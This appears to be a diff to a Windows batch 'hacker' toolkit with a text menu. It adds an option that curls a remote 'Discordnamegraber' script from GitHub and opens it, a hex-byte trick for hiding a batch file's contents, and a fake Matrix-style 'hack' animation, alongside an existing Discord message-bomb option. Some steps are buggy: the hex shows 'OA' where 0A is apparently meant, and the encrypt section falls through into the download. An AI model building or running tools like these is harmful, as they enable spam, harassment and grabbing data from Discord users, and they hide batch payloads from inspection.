@@ -35,8 +35,11 @@ echo ╠════════════════════════
 set /p choice=╚══════»
 if /I "%choice%"=="h" goto help
 if /I "%choice%"=="message" goto message
-if /I "%choice%"=="settings" goto settings\
+if /I "%choice%"=="settings" goto settings
 if /I "%choice%"=="messagebomb" goto messagebomb
+if /I "%choice%"=="encrypt" goto encrypt
+if /I "%choice%"=="ipscriptgen" goto ipscriptgen
+if /I "%choice%"=="fakehack" goto fakehack
 goto banner
 
 :settings
@@ -54,7 +57,7 @@ echo ╠═     Save Settings     ═╣
 echo ╠═        /save\         ═╣
 echo ╠═════════════════════════╣
 echo ╠═     Go Back With b    ═╣
-echo ╚═════════════════════════╝
+echo ╠═════════════════════════╝
 set /p choice=╚══════»
 
 if /I "%choice%"=="color" goto changeColor
@@ -93,18 +96,26 @@ cls
 echo ╔═════════════════════════╗
 echo ╠═          HELP         ═╣
 echo ╠═════════════════════════╣
-echo ╠═    Text Ms Discord    ═╣
-echo ╠═       /message\       ═╣
-echo ╠═════════════════════════╣
 echo ╠═        Settings       ═╣
 echo ╠═       /settings\      ═╣
 echo ╠═════════════════════════╣
+echo ╠═    Text Ms Discord    ═╣
+echo ╠═       /message\       ═╣
 echo ╠═════════════════════════╣
 echo ╠═     Ms Bomb On Dis    ═╣
 echo ╠═     /messagebomb\     ═╣
 echo ╠═════════════════════════╣
+echo ╠═    Encrypt Bat File   ═╣
+echo ╠═       /encrypt\       ═╣
+echo ╠═════════════════════════╣
+echo ╠═   Ip Graber Script    ═╣
+echo ╠═     /ipscriptgen\     ═╣
+echo ╠═════════════════════════╣
+echo ╠═      Wow Hacker       ═╣
+echo ╠═      /fakehack\       ═╣
+echo ╠═════════════════════════╣
 echo ╠═     Go Back With b    ═╣
-echo ╚═════════════════════════╝
+echo ╠═════════════════════════╝
 set /p choice=╚══════»
 if /I "%choice%"=="b" goto banner
 goto help
@@ -265,3 +276,61 @@ if /I "%again%"=="new" goto messagebomb
 
 echo Invalid option. Returning to the Start Menu...
 goto banner
+
+:encrypt
+cls
+echo ╔═════════════════════════╗
+echo ╠═    Add This in hex    ═╣
+echo ╠═════════════════════════╣
+echo ╠ FF FE 26 63 6c 73 0D OA ╣
+echo ╠═════════════════════════╣
+echo ╠═     Go Back With b    ═╣
+echo ╠═════════════════════════╝
+set /p choice=╚══════»
+if /I "%choice%"=="b" goto banner
+pause
+
+:ipscriptgen
+cls
+echo Downloading remote script from GitHub...
+
+:: Set correct RAW GitHub URL to the TXT file
+set "url=https://raw.githubusercontent.com/NFCsamurai/Discordnamegraber/main/discordnamegraber.txt"
+
+:: Name of the output file (you can make it .bat if it's meant to be run)
+set "output=script.txt"
+
+:: Use curl to download
+curl -s -o "%output%" "%url%"
+
+:: Check if the file downloaded
+if exist "%output%" (
+    echo Script downloaded successfully as "%output%".
+) else (
+    echo Failed to download the script. Please check the URL or internet connection.
+)
+
+start script.txt
+
+goto banner
+
+
+:fakehack
+cls
+:: Set characters for Matrix rain (you can add more)
+set "chars=アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789"
+
+:: Max line width
+set "width=80"
+
+:: Infinite loop
+:loop
+set "line="
+for /L %%i in (1,1,%width%) do (
+    set /a "rand=!random! %% 55"
+    call set "char=%%chars:~!rand!,1%%"
+    set "line=!line!!char!"
+)
+
+echo !line!
+goto loop
